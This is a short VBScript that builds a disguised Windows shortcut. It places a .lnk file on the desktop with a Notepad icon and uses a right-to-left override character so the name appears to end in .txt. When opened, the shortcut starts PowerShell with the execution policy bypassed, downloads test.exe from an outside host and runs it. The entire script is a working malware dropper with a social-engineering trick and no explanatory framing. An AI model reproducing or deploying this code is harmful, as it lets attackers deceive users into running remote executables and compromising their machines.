Set WshShell = CreateObject("WScript.Shell")
Set ShApp = CreateObject("Shell.Application")
DesktopPath = ShApp.Namespace(0).Self.Path
unicode = Unescape("%u004d%u0079%u0050%u0069%u0063%u0073%u005f%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b")
unicodeName = "unicode.lnk"
shortcutPath = DesktopPath & "\" & unicodeName
Set lnk = WshShell.CreateShortcut(shortcutPath)
lnk.TargetPath = "powershell.exe"
lnk.Arguments =  "-ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://illmob.org/test.exe','test.exe');./test.exe;"
lnk.IconLocation = "c:\windows\system32\notepad.exe"
lnk.Save()
Set FSO = CreateObject("Scripting.FileSystemObject")
Set file = FSO.GetFile(shortcutPath)
file.name = unicode & ".lnk"
